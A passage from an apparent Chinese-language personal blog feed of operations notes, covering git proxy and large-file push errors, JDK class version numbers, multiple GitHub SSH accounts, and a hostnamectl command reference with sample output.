    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对日常使用git过程中遇到的问题及解决方案记录总结</p><h2 id="CentOS-无法-git-clone"><a href="#CentOS-无法-git-clone" class="headerlink" title="CentOS 无法 git clone"></a>CentOS 无法 git clone</h2><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1、设置socket5代理</p><p>git config –global http.<a href="https://github.com.proxy/">https://github.com.proxy</a> socks5:&#x2F;&#x2F;10.222.28.7:1081</p><p>2、取消代理</p><p>git config –global –unset http.proxy git config –global –unset https.proxy</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] 设置代理解决github被墙 TjFish 2022-03-15 21:57</p><p>链接：<a href="https://zhuanlan.zhihu.com/p/481574024">https://zhuanlan.zhihu.com/p/481574024</a></p><h2 id="上传文件过大"><a href="#上传文件过大" class="headerlink" title="上传文件过大"></a>上传文件过大</h2><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a><strong>报错信息</strong></h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  studynote git:(main) git push <br>枚举对象中: <span class="hljs-number">834</span>, 完成.<br>对象计数中: <span class="hljs-number">100</span>% (<span class="hljs-number">834</span><span class="hljs-operator">/</span><span class="hljs-number">834</span>), 完成.<br>使用 <span class="hljs-number">8</span> 个线程进行压缩<br>压缩对象中: <span class="hljs-number">100</span>% (<span class="hljs-number">829</span><span class="hljs-operator">/</span><span class="hljs-number">829</span>), 完成.<br>写入对象中: <span class="hljs-number">100</span>% (<span class="hljs-number">831</span><span class="hljs-operator">/</span><span class="hljs-number">831</span>), <span class="hljs-number">467.85</span> MiB | <span class="hljs-number">1.09</span> MiB<span class="hljs-operator">/</span>s, 完成.<br>总共 <span class="hljs-number">831</span>（差异 <span class="hljs-number">13</span>），复用 <span class="hljs-number">0</span>（差异 <span class="hljs-number">0</span>），包复用 <span class="hljs-number">0</span><br><span class="hljs-params">remote:</span> Resolving <span class="hljs-params">deltas:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">13</span><span class="hljs-operator">/</span><span class="hljs-number">13</span>), done.<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> <span class="hljs-params">Trace:</span> b0be7add97db98c12a70ff80495a417f07375427385a833f1e5978a2830b3fb7<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> See https:<span class="hljs-symbol">//gh.io/lfs</span> for more information.<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> File security<span class="hljs-symbol">/secResources/PPT/FireShot</span> Capture <span class="hljs-number">001</span> <span class="hljs-operator">-</span> 华为Anti-DDoS方案技术白皮书-V600R21C10 <span class="hljs-operator">-</span> 华为企业业务 <span class="hljs-operator">-</span> e.huawei.com.pdf is <span class="hljs-number">309.68</span> MB; this exceeds GitHub&#x27;s file size limit of <span class="hljs-number">100.00</span> MB<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> <span class="hljs-params">GH001:</span> Large files detected. You may want to try Git Large File Storage <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//git-lfs.github.com.</span><br>To ncgithub.com:C0isini<span class="hljs-symbol">/studynote.git</span><br> <span class="hljs-operator">!</span> [remote rejected] main <span class="hljs-operator">-&gt;</span> main (pre-receive hook declined)<br>错误：无法推送一些引用到 &#x27;ncgithub.com:C0isini<span class="hljs-operator">/</span>studynote.git&#x27;<br></code></pre></td></tr></table></figure><p>清除本地缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  studynote git:(main) ✗ git <span class="hljs-built_in">rm</span> -r --cached .<br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;.gitignore&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;README.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangBase.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangError.md&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>git</tag>
      
      <tag>error</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jdk_base</title>
    <link href="/2024/03/15/yunwei/applications/java/jdk_base/"/>
    <url>/2024/03/15/yunwei/applications/java/jdk_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="JDK版本信息"><a href="#JDK版本信息" class="headerlink" title="JDK版本信息"></a>JDK版本信息</h2><table><thead><tr><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">JDK版本</td><td align="center">major.minor version</td><td align="center">十六进制表示</td></tr><tr><td align="center">1.1</td><td align="center">45</td><td align="center">0x2D hex</td></tr><tr><td align="center">1.2</td><td align="center">46</td><td align="center">0x2E hex</td></tr><tr><td align="center">1.3</td><td align="center">47</td><td align="center">0x2F hex</td></tr><tr><td align="center">1.4</td><td align="center">48</td><td align="center">0x30 hex</td></tr><tr><td align="center">1.5</td><td align="center">49</td><td align="center">0x31 hex</td></tr><tr><td align="center">1.6</td><td align="center"><em><strong>50</strong></em></td><td align="center">0x32 hex</td></tr><tr><td align="center">1.7</td><td align="center">51</td><td align="center">0x33 hex</td></tr><tr><td align="center">Java8</td><td align="center">52</td><td align="center">0x34 hex</td></tr><tr><td align="center">Java9</td><td align="center">53</td><td align="center"></td></tr><tr><td align="center">Java10</td><td align="center">54</td><td align="center"></td></tr><tr><td align="center">Java11</td><td align="center">55</td><td align="center"></td></tr><tr><td align="center">Java12</td><td align="center">56</td><td align="center"></td></tr><tr><td align="center">Java13</td><td align="center">57</td><td align="center"></td></tr><tr><td align="center">Java14</td><td align="center">58</td><td align="center"></td></tr><tr><td align="center">Java15</td><td align="center">59</td><td align="center"></td></tr><tr><td align="center">Java16</td><td align="center">60</td><td align="center"></td></tr><tr><td align="center">Java17</td><td align="center">61</td><td align="center"></td></tr><tr><td align="center">Java18</td><td align="center">62</td><td align="center"></td></tr><tr><td align="center">这里只需要记住JDK11的版本号是55,以此为基准上下加减进行即可!</td><td align="center"></td><td align="center"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>jdk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_tips</title>
    <link href="/2024/03/15/yunwei/applications/git/git_tips/"/>
    <url>/2024/03/15/yunwei/applications/git/git_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="配置多个账号"><a href="#配置多个账号" class="headerlink" title="配置多个账号"></a>配置多个账号</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>mac 电脑配置多个github账号 ssh</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><h3 id="生成不同账号密钥"><a href="#生成不同账号密钥" class="headerlink" title="生成不同账号密钥"></a>生成不同账号密钥</h3><p>ssh-keygen -t rsa -C “github登录邮箱” -f ~&#x2F;.ssh&#x2F;id_rsa_密钥名称，生成不同账号的密钥，只需要修改 “github登录邮箱”和“密钥名称”即可</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">ssh-keygen -t rsa -C <span class="hljs-string">&quot;pr0t0n119<span class="hljs-variable">@proton</span>.me&quot;</span> -f ~<span class="hljs-regexp">/.ssh/id</span>_rsa_moss119<br></code></pre></td></tr></table></figure><p>会生成私钥 id_rsa_密钥名称、公钥 id_rsa_密钥名称_pub</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">➜  .ssh ssh-keygen -t rsa -C <span class="hljs-string">&quot;pr0t0n119@proton.me&quot;</span> -f ~/.ssh/id_rsa_moss119<br>Generating public/private rsa key pair.<br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /Users/admin/.ssh/id_rsa_moss119<br>Your public key has been saved in /Users/admin/.ssh/id_rsa_moss119.pub<br>The key fingerprint is:<br>SHA256:OgJRf1mQeTWUV+aBbqmaEHcX++qtnONdan/JBzzrIeg pr0t0n119<span class="hljs-meta">@proton.me</span><br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|<span class="hljs-string">    .   .+.o+..oo</span>|<br>|<span class="hljs-string">   . .  oo. .+.o.</span>|<br>|<span class="hljs-string">  .   . o.  ..+ .</span>|<br>|<span class="hljs-string">   .   o . . *   </span>|<br>|<span class="hljs-string">  .     S . +..  </span>|<br>|<span class="hljs-string">   .   o   o  +. </span>|<br>|<span class="hljs-string">    . o . + . ++o</span>|<br>|<span class="hljs-string">     . . +  .+*=+</span>|<br>|<span class="hljs-string">          E oO=++</span>|<br>+----[SHA256]-----+<br></code></pre></td></tr></table></figure><h3 id="公钥写入对应GitHub"><a href="#公钥写入对应GitHub" class="headerlink" title="公钥写入对应GitHub"></a>公钥写入对应GitHub</h3><p>配置链接，账号settings-&gt;SSH and GPG keys-&gt;SSH keys-&gt;New SSH Key</p><p><a href="https://github.com/settings/keys">https://github.com/settings/keys</a></p><p>title：可以随意填写</p><p>Key type：默认 Authentication Key</p><p>Key：公钥 id_rsa_密钥名称_pub的内容</p><h3 id="配置-ssh-config-文件"><a href="#配置-ssh-config-文件" class="headerlink" title="配置 ssh config 文件"></a>配置 ssh config 文件</h3><h4 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h4><p>~&#x2F;.ssh&#x2F;config</p><h4 id="配置文件添加内容"><a href="#配置文件添加内容" class="headerlink" title="配置文件添加内容"></a>配置文件添加内容</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host moss119github.com<br>  HostName github.com<br>  <span class="hljs-keyword">User</span> <span class="hljs-title">git</span><br>  IdentityFile ~/.ssh/id_rsa_moss119<br>  PreferredAuthentications publickey<br></code></pre></td></tr></table></figure><p>Host：HostName 的别名</p><p>HostName：GitHub 的主机名为 “github.com”</p><p>User：设置为 “git”，是 GitHub 上 SSH 连接的默认用户名</p><p>IdentityFile： 指定 GitHub 身份验证密钥文件的路径。如果 GitHub 密钥不是默认的 <code>~/.ssh/id_rsa</code>，则需要指定正确的路径。例如，密钥文件名为 <code>id_rsa_moss119</code>，则将其路径设置为 <code>~/.ssh/id_rsa_moss119</code>。</p><h3 id="验证SSH登录"><a href="#验证SSH登录" class="headerlink" title="验证SSH登录"></a>验证SSH登录</h3><p>ssh -T 别名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  moss119<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span> git:(main) ssh -T moss119github<span class="hljs-selector-class">.com</span><br>Hi moss119! You<span class="hljs-string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></code></pre></td></tr></table></figure><h2 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h2><h3 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  moss119<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span> git:(main) ssh -T moss119github<span class="hljs-selector-class">.com</span>     <br>admin@github<span class="hljs-selector-class">.com</span>: Permission denied (publickey).<br></code></pre></td></tr></table></figure><p>ssh config 没有设置用户名且命令中没有指定用户，会使用当前设备登录的用户名进行登录验证，肯定会报错</p><p>解决方案</p><p>ssh config 中设置用户：User git</p><p>或</p><p>命令中指定用户 ：<a href="mailto:&#103;&#105;&#116;&#64;&#109;&#x6f;&#115;&#x73;&#49;&#x31;&#x39;&#103;&#105;&#116;&#104;&#117;&#98;&#46;&#99;&#111;&#x6d;">&#103;&#105;&#116;&#64;&#109;&#x6f;&#115;&#x73;&#49;&#x31;&#x39;&#103;&#105;&#116;&#104;&#117;&#98;&#46;&#99;&#111;&#x6d;</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.quafoo.net/posts/Add-Multi-Github-Account-On-Same-Mac/">https://www.quafoo.net/posts/Add-Multi-Github-Account-On-Same-Mac/</a></p><h1 id="SSH拉取代码"><a href="#SSH拉取代码" class="headerlink" title="SSH拉取代码"></a>SSH拉取代码</h1><ol><li><p>在本地生成 SSH key，命令为 <code>ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot;</code>，这里的 <code>xxxxx@xxxxx.com</code> 是你的邮箱地址，并不要求与特定的邮箱地址匹配。</p></li><li><p>把公钥放到 GitHub 上。在本地找到 id_rsa.pub 文件，复制里面的内容。然后回到 GitHub，进入自己的设置（Settings）页面，在 “SSH and GPG keys” 下点击 “New SSH key”，在 Key 框里粘贴刚才复制的公钥内容，然后点击 “Add key”。</p></li><li><p>测试代码是否推拉正常。在本地找个文件夹打开 Git Bash，输入 <code>git clone &lt;你的仓库SSH地址&gt;</code>，然后会瞬间拉取成功，SSH 配置就完成了。</p><p>仓库SSH地址需要注意，如果本地 ~&#x2F;.ssh&#x2F;config 文件中有配置特定的HOST，需要和配置的相同</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Host ncgithub<span class="hljs-selector-class">.com</span><br>  HostName github<span class="hljs-selector-class">.com</span><br>  IdentityFile ~/.ssh/id_rsa_nc<br>  PreferredAuthentications publickey<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">原始：<br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>@github.com:C0isini/studynote.git<br><br>修改后：<br><br><br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>@ncgithub.com:C0isini/studynote.git<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hostnamectl</title>
    <link href="/2024/03/15/yunwei/yunweicommands/Linuxcommands/hostnamectl/"/>
    <url>/2024/03/15/yunwei/yunweicommands/Linuxcommands/hostnamectl/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h1><p>控制系统主机名</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>CPE OS <span class="hljs-attribute">Name</span>: <span class="hljs-attribute">cpe</span>: /<span class="hljs-attribute">o</span>:<span class="hljs-attribute">almalinux</span>:<span class="hljs-attribute">almalinux</span>:<span class="hljs-number">9</span>::baseos<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><p>Static hostname  静态主机名</p><p>Icon name 图标名</p><p>Chassis 主机类型</p><p>Machine ID 主机ID</p><p>Boot ID</p><p>Virtualization: kvm 虚拟化，可以用来标记是否是虚拟机，物理机不存在该数据</p><p>Operating System：Ubuntu 22.04.2 LTS 操作系统信息</p><p>CPE OS Name:  cpe: &#x2F;o:almalinux:almalinux:9::baseos </p><p>Kernel: Linux 5.15.0-73-generic 内核信息</p><p>Architecture: x86-64 架构信息（x86-64）</p><p>Hardware Vendor: Alibaba Cloud  硬件供应商</p><p>Hardware Model: Alibaba Cloud ECS 硬件型号</p><p>Firmware Version: xxxzz-U08 固件版本</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>hostnamectl [OPTIONS…] {COMMAND}</p><h3 id="主机名类型"><a href="#主机名类型" class="headerlink" title="主机名类型"></a>主机名类型</h3><h4 id="pretty-主机名"><a href="#pretty-主机名" class="headerlink" title="pretty 主机名"></a>pretty 主机名</h4><p>易读的主机名称，对字符几乎没有限制（可以使用特殊字符# @ 等）</p><p>存储在 &#x2F;etc&#x2F;machine-info，从 machine-info 命令中可查看更多信息</p><p>默认设备是没有该名称的，使用 hostnamectl –pretty 查询结果为空，&#x2F;etc&#x2F;machine-info 文件也是不存在的，如果使用 hostnamectl set-hostname 设置后，文件和查询都会存在</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># ls -lat /etc/machine-info</span><br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 28 </span>Jan<span class="hljs-number"> 30 </span>15:20 /etc/machine-info<br></code></pre></td></tr></table></figure><h4 id="static-主机名（常说的主机名）"><a href="#static-主机名（常说的主机名）" class="headerlink" title="static 主机名（常说的主机名）"></a>static 主机名（常说的主机名）</h4><p>静态主机名称，用于启动时初始化内核主机名，对字符有限制（不可以使用特殊字符# @ 等）</p><p>存储在 &#x2F;etc&#x2F;hostname，从 hostname命令中可查看更多信息</p><h4 id="transient-主机名"><a href="#transient-主机名" class="headerlink" title="transient 主机名"></a>transient 主机名</h4><p>临时主机名称，从网络配置中接收到的临时主机名，如果静态主机名有设置，且不是localhost，就不使用临时主机名，对字符有限制（不可以使用特殊字符# @ 等）</p><p>可以使用systemd-firstboot(1)初始化挂载(但未启动)系统映像的系统主机名。</p><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><h4 id="–no-ask-password"><a href="#–no-ask-password" class="headerlink" title="–no-ask-password"></a>–no-ask-password</h4><p>执行特权操作时不需要密码</p><h4 id="–static-–pretty-–transient"><a href="#–static-–pretty-–transient" class="headerlink" title="–static –pretty –transient"></a>–static –pretty –transient</h4><p>仅显示对应主机名，搭配 status 命令使用，由于 status 是 hostnamectl 默认命令，也可以不写，例如 hostnamectl –static 等价于 hostnamectl –static status</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment">#</span><br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static status</span><br>iZbp1191gh7vw52537lyxrZ<br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>iZbp1191gh7vw52537lyxrZ<br></code></pre></td></tr></table></figure><p>与 set-hostname命令搭配使用，用于修改指定的主机名</p><h4 id="–version"><a href="#–version" class="headerlink" title="–version"></a>–version</h4><p>显示工具版本信息</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># hostnamectl --version</span><br><span class="hljs-params">system</span>d <span class="hljs-number">249</span> (<span class="hljs-number">249.11</span>-<span class="hljs-number">0</span>ubuntu3.<span class="hljs-number">9</span>)<br>+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 -PWQUALITY -P11KIT -QRENCODE +<span class="hljs-literal">BZIP2</span> +LZ4 +XZ +<span class="hljs-literal">ZLIB</span> +ZSTD -XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified<br></code></pre></td></tr></table></figure><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="status"><a href="#status" class="headerlink" title="status"></a>status</h4><p>显示当前主机名和相关信息</p><h4 id="set-hostname-hostname-NAME"><a href="#set-hostname-hostname-NAME" class="headerlink" title="set-hostname&#x2F;hostname NAME"></a>set-hostname&#x2F;hostname NAME</h4><p>修改主机名，默认会修改 pretty static transient 主机名</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl set-hostname aliyun#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br>aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /etc/machine-i</span><br>machine-id    machine-info<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /etc/machine-info</span><br><span class="hljs-title class_">PRETTY_HOSTNAME</span>=aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls -lat /etc/machine-info</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">28</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">30</span> <span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> /etc/machine-info<br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>aliyun<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --transient</span><br>aliyun<br><br><br></code></pre></td></tr></table></figure><p>可以指定只修改某个主机名 hostnamectl –static set-hostname iZbp1191gh7vw52537lyxrZ</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static set-hostname iZbp1191gh7vw52537lyxrZ</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br>aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>iZbp1191gh7vw52537lyxrZ<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --transient</span><br>iZbp1191gh7vw52537lyxrZ<br></code></pre></td></tr></table></figure><h4 id="set-icon-name-icon-name-NAME"><a href="#set-icon-name-icon-name-NAME" class="headerlink" title="set-icon-name&#x2F;icon-name NAME"></a>set-icon-name&#x2F;icon-name NAME</h4><p>设置主机图标名称，图标名称用于一些图形化程序可视化当前主机</p><p>NAME 为空’’的时候，会重置为默认值</p><p>一般都是 computer-vm</p><h4 id="set-chassis-chassis-TYPE"><a href="#set-chassis-chassis-TYPE" class="headerlink" title="set-chassis&#x2F;chassis TYPE"></a>set-chassis&#x2F;chassis TYPE</h4><p>设置主机类型，主机类型用于一些图形化程序可视化主机或者修改用户交互</p><p>TYPE  为空’’的时候，会重置为默认值</p><p>TYPE可选参数：</p><p>desktop</p><p>laptop（笔记本）</p><p>server</p><p>tablet（平板电脑）</p><p>handset（手机）</p><p>watch</p><p>embedded</p><p>vm</p><p>container</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl set-chassis watch<br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-watch<br>         <span class="hljs-attribute">Chassis</span>: watch<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba 